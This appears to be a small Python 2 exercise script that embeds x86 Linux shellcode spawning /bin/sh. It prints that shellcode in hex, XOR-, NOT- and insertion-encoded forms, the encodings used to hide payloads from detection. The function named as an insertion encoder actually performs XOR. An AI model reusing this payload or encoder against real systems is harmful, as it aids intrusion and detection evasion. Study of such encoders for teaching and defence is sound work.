shellcode = ('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80')


def custom_insertion_encoder():
	print "XOR Custom Insertion Encoder"
	i=1
	encoded_shellcode = ''
	for byte in bytearray(shellcode):
		a = byte ^ 0xaa
		encoded_shellcode +='0x%02x,' % a
	print encoded_shellcode

encoded_with_0x = ''
encoded_with_slash_x = ''
original_shellcode = ''
not_encoded_shellcode = ''
for byte in bytearray(shellcode):
	
	original_shellcode += '0x%02x,' % byte
	
	complement = ~byte
	not_encoded_shellcode += '0x%02x,' % (complement & 0xff)

	#print 'byte: '+str(byte)
	#print '02x: %02x' % byte
	encoded_with_slash_x += '\\x'
	encoded_with_slash_x += '%02x' % byte
	encoded_with_slash_x += '\\x%02x' % 0xaa


	encoded_with_0x += '0x'
	encoded_with_0x += '%02x,' % byte
	encoded_with_0x += '0x%02x,' % 0xaa

print original_shellcode
print '\n'
#print encoded_with_slash_x
#print '\n'
#print encoded_with_0x
#print '\n'
#print '0xaa,' * len(shellcode)
#print 'Not \n'
#print not_encoded_shellcode
custom_insertion_encoder()
